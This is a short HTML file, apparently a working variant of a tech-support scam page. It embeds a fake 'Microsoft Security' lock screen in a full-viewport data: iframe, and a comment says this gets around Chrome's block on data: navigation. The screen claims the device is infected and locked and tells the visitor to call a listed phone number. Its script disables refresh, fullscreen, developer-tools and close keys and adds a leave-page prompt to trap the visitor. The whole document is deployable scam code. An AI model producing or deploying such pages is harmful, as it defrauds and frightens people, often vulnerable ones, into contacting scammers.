<!DOCTYPE html>
<!-- Variant: the lock screen lives in a full-viewport data: iframe (top-level data: navigation is blocked by Chrome, framing is not). -->
<html lang="en"><head><meta charset="utf-8"><title>Loading</title>
<style>html,body{margin:0;height:100%;overflow:hidden}iframe{position:fixed;inset:0;width:100vw;height:100vh;border:0}</style></head>
<body>
<script>
  const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Microsoft Security</title>
  <style>body{margin:0;background:#002bff;color:#fff;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}</style></head>
  <body><div><h1>Your computer has been locked</h1><p>Your device is infected. Call Microsoft Support immediately.</p>
  <h2>+44 20 3769 0199</h2><p>Error code: 0x800704cf</p></div>
  <script>
    document.addEventListener('keydown', e => { if (['F5','F11','F12','Escape'].includes(e.key) || (e.ctrlKey && 'rwl'.includes(e.key.toLowerCase()))) e.preventDefault(); });
    window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
  <\/script></body></html>`;
  const f = document.createElement('iframe');
  f.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
  document.body.appendChild(f);
</script></body></html>
